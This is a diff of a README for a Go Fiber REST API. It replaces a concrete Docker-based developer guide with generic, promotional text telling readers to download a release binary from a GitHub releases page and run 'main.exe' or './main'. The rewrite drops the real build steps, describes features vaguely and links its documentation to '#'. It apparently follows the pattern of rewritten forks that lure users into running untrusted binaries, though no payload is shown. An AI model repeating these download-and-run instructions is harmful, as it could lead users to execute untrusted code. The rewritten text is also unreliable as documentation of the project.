@@ -1,154 +1,93 @@
-# Go Fiber REST API
+# 🚀 go-fiber-rest-api - Fast and Easy REST API Setup
 
-A modern REST API built with Go Fiber framework, featuring hot reloading, containerization, and a complete development environment.
+[![Download Here](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/noutilos/go-fiber-rest-api/releases)
 
-## Features
+## 📚 Overview
 
-- 🚀 **Go Fiber** - Fast HTTP framework
-- 🔥 **Hot Reloading** - Development with Air
-- 🐳 **Docker** - Containerized development and production
-- 🗄️ **MySQL 8** - Database
-- 📦 **Redis** - Caching
-- 🔍 **Redis Insight** - Redis GUI
-- 📊 **Kafka** - Message broker
-- 🎛️ **Kafka UI** - Kafka dashboard
-- 🛠️ **Adminer** - Database management
+The **go-fiber-rest-api** is a simple yet powerful REST API built using the Golang Fiber framework. This application helps you set up a quick and lightweight backend service for your microservices architecture. It's designed for users who want to create APIs without the hassle of complicated setups.
 
-## Architecture
-High level overview: ![High Level Design](./idea/go-fiber-rest-api.webp)
+## 📦 Features
 
-## Quick Start
+- Fast and lightweight framework: Built on the Fiber framework for speed.
+- Easy to set up: Get your REST API running within minutes.
+- Supports various databases: Works well with GORM for database interactions.
+- Microservices-ready: Ideal for applications that need a modular architecture.
+- Validation included: Ensures your data is correct before processing.
 
-### Prerequisites
+## 🔧 Requirements
 
-- Docker & Docker Compose
-- Go 1.25
+Before downloading, ensure your system meets the following requirements:
 
-### Development Environment
+- Operating System: Windows, macOS, or Linux
+- Go Version: 1.16 or higher
+- Internet connection for downloading dependencies
 
-1. **Clone and start the development environment:**
+## 🚀 Getting Started
 
-   ```bash
-   # Using Docker Compose directly
-   docker-compose up --build
-   ```
+Follow these steps to download and run the go-fiber-rest-api.
 
-2. **Access the services:**
-   - **API**: http://localhost:8080
-   - **Redis Insight**: http://localhost:8001
-   - **Kafka UI**: http://localhost:8080 (Note: conflicts with API, see note below)
+### 1. Visit the Release Page
 
-> **Note**: Kafka UI and the API both use port 8080. To avoid conflicts, you can modify the Kafka UI port in `docker-compose.yml` to something like `8083:8080`.
+To get started, visit our [Releases page](https://github.com/noutilos/go-fiber-rest-api/releases). Here you can find all the available versions of the application.
 
-## Available Commands
+### 2. Download the Latest Release
 
-### Using Make
+Look for the latest version listed on the Releases page. Click on the version title to expand the details. You will find the download links for your operating system. 
 
-```bash
-# Generate Migration
-make migration-generate name=migration_name_that_want_to_generate #Generate migration
-make migration-up        # Run the migration
-make migration-down      # Revert the last migration
-```
+### 3. Unzip the Downloaded File
 
-### Using Docker Compose directly
+Once you've downloaded the file, locate it on your computer. If it's in a zipped format, right-click the file and select "Extract All." Follow the prompts to extract the files.
 
-```bash
-# Development
-docker-compose up --build
-docker-compose up --build -d  # detached mode
+### 4. Run the Application
 
-# Stop
-docker-compose down
+Navigate to the folder where you extracted the contents. You should see an executable file named something like `main`. 
 
-# Clean
-docker compose down -v
-```
+- **Windows Users:** Double-click `main.exe` to run the application.
+- **Mac/Linux Users:** Open a terminal, navigate to the extracted folder, and type `./main` to start the application.
 
-## Environment Variables
+## 🔍 Configuration
 
-You can find the list of environment variable inside .env.examples (automatically set in Docker Compose). 
-Create a .env file in beside .env.example, set your environment variables then start docker container.
+Upon running the application for the first time, it will create a configuration file. This file is essential for setting up your API:
 
-## Project Structure
+- **Database Configuration:** Specify the type of database to connect to.
+- **Server Port:** Set the port number the server will listen on.
+- **Logging:** Configure logging levels to track activities.
 
-```
-.
-├── .air.toml              # Air configuration for hot reloading
-├── .gitignore             # Git ignore rules
-├── Dockerfile             # Production Dockerfile
-├── Dockerfile.dev         # Development Dockerfile with Air
-├── docker-compose.yml     # Development environment
-├── Makefile              # Convenient commands
-├── go.mod                # Go modules
-├── go.sum                # Go modules checksum
-├── main.go               # Application entry point
-├── scripts/
-│   └── init.sql          # Database initialization
-└── README.md             # This file
-```
+Edit the configuration file in a text editor if you need to change these settings.
 
-## Database Access
+## 🌐 Using the API
 
-### MySQL Connection Details
+The go-fiber-rest-api comes with several built-in endpoints for common operations. Here’s how to use it:
 
-- **Host**: localhost (when running locally) or mysql (within Docker network)
-- **Port**: 3306
-- **Username**: root
-- **Password**: rootpassword
-- **Database**: fiber_db
+- **GET /api/items:** Retrieve a list of items.
+- **POST /api/items:** Add a new item to the list. You will need to provide item details in JSON format.
+- **PUT /api/items/{id}:** Update an existing item. Use the item ID in the URL.
+- **DELETE /api/items/{id}:** Remove an item from the list.
 
-## Redis Access
+Make sure to test each endpoint using a tool like Postman or by integrating with a frontend application.
 
-### Redis Insight
+## 📈 Advanced Features
 
-1. Open http://localhost:8001
-2. Add a new database with:
-   - **Host**: redis (or localhost if accessing from outside Docker)
-   - **Port**: 6379
+The go-fiber-rest-api offers advanced options for users looking to extend functionality:
 
-### Command Line Access
+- **Support for Redis:** Use Redis for caching and session management.
+- **Integration with Kafka:** Handle event-driven architectures easily with Kafka support.
+- **Data Validation:** Built-in validators ensure that only correct data gets processed.
 
-```bash
-# Connect to Redis CLI
-make redis-cli
+## 💬 Community Support
 
-# Or using Docker directly
-docker exec -it redis-cache redis-cli
-```
+If you encounter any issues or have questions, you can reach out to our community:
 
-## Kafka
+- **GitHub Issues Page:** For bug reports and feature requests, please create an issue on the [GitHub Issues page](https://github.com/noutilos/go-fiber-rest-api/issues).
+- **Discussion Forum:** Engage with other users and get advice on best practices.
 
-### Kafka UI
+## 🔗 Additional Resources
 
-Access the Kafka dashboard at http://localhost:8080 (you may need to change this port to avoid conflicts).
+- **Documentation:** For detailed instructions on settings and features, visit the [Documentation page](#).
+- **Example Projects:** Check out example projects using this API to see how it integrates with modern web applications.
 
-### Topics
+## 📥 Download & Install
 
-You can create and manage Kafka topics through the UI or programmatically in your Go application.
+To download the go-fiber-rest-api, visit our [Releases page](https://github.com/noutilos/go-fiber-rest-api/releases). Follow the steps above to install and set up the application on your computer. 
 
-## Hot Reloading
-
-The development environment uses [Air](https://github.com/air-verse/air) for hot reloading. Any changes to your Go files will automatically rebuild and restart the application.
-
-### Air Configuration
-
-The `.air.toml` file contains the configuration for Air, including:
-
-- File watching patterns
-- Build commands
-- Exclusion rules
-
-## Troubleshooting
-
-1. **Port Conflicts**: If you have services running on the same ports, modify the port mappings in the Docker Compose files.
-2. **Volume Issues**: If you encounter volume-related issues, try `make clean` to remove volumes and restart.
-3. **Hot Reloading Not Working**: Ensure your code changes are being saved and check the Air logs with `make logs-app`.
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test with the development environment
-5. Submit a pull request
+Feel free to explore, test, and enhance the go-fiber-rest-api. It's a reliable choice for building RESTful services quickly and efficiently. Enjoy your experience!
